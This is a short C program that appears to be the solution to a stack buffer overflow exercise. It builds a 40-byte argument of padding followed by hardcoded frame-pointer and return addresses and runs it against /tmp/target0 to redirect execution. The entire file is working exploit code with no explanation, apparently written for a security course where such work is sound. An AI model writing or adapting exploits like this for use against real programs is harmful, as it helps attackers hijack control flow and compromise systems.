#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/tmp/target0"

int main(void)
{
  char *args[3];
  char *env[1];
  char buffer[40]; // 32+8

  memset(buffer, 0x41, 32);
  *((int *)(buffer + 32)) = 0xbffffe68;
  *((int *)(buffer + 36)) = 0x0804851d;

  args[0] = TARGET;
  args[1] = buffer;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}